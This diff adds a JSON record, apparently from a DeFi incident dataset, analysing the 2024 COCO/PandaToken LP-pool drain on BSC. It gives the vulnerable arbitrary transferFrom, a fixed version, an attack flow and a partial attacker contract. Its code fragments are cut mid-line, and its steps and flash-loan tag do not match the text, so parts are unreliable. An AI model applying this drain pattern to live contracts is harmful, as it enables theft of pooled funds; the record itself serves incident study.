@@ -1,0 +1,32 @@
+{
+ "id": "2024__2024-08-14_COCO_FlashLoanTransferFromDrain",
+ "source_file": "2024/2024-08-14_COCO_FlashLoanTransferFromDrain.md",
+ "title": "COCO (Panda Token) — LP Pool Drain via Arbitrary transferFrom Analysis",
+ "date": "2024-08-14",
+ "protocol": "COCO / PandaToken",
+ "chain": "BSC",
+ "loss_raw": "~280 BNB",
+ "loss_usd": null,
+ "root_cause": "Vulnerable contract allowed arbitrary transferFrom, enabling direct transfer of LP pool balance followed by swap",
+ "attack_tx": "0x7b74...875 (block 41,529,777)",
+ "vulnerable_contract": "Address unconfirmed",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: executes transferFrom from an arbitrary address for an arbitrary amount\nfunction drainFunds(address token, address from, address to, uint256 amount) external {\n    //",
+  "❌ No caller validation — anyone can move another party's assets\n    IERC20(token).transferFrom(from, to, amount);\n}\n\n//",
+  "// File: COCO_decompiled.sol\ncontract COCO {\n    function transfer(address p0, uint256 p1) external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Correct code: access control + only allowed tokens/addresses\nfunction drainFunds(address token, address from, address to, uint256 amount) external {\n    require(msg.sender == owner, \"Not owner\");  //",
+  "✅ Access control\n    require(allowedTokens[token], \"Token not allowed\");  //"
+ ],
+ "steps": [
+  "[5] ► Swap PandaToken → USDT to realize profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► Deploy AttackerC contract\n  │\n  ├─[2]─► Query USDT balance of LP pool (PancakeSwap Pair) via vulnerable contract\n  │         └─► USDT.balanceOf(LP_PAIR) = X USDT\n  │\n  ├─[3]─► Execute arbitrary transferFrom via vulnerable contract\n  │         └─► USDT.transferFrom(LP_PAIR, address(this), X USDT)\n  │               └─► Directly moves LP pool's USDT to attacker\n  │\n  ├─[4]─► Call LP pool swap()\n  │         └─► Acquire large amount of PandaToken using manipulated reserves\n  │\n  ├─[5]─► Swap PandaToken → USDT to realize profit\n  │\n  └─[6]─► Total loss: ~280 BNB",
+  "contract AttackerC {\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IPancakePair LP_PAIR;\n\n    constructor(address _pair, address vulnContract) {\n        LP_PAIR = IPancakePair(_pair);\n\n        // [3] Directly move LP pool's USDT balance (exploiting vulnerable contract)\n        uint256 lpUsdtBal = USDT.balanceOf(address(LP_PAIR));\n        IVulnContract(vulnContract).transferFrom(\n            address(USDT),\n            address(LP_PAIR),\n            address(this),\n            lpUsdtBal\n        );\n\n        // [4] Acquire large amount of PandaToken by exploiting reserve imbalance\n        (uint112 r0, uint112 r1,) = LP_PAIR.getReserves();\n        uint256 pandaOut = /* calculated based on manipulated reserves */;\n        LP_PAIR.swap(pandaOut, 0, address(this), \"\");\n  "
+ ]
+}
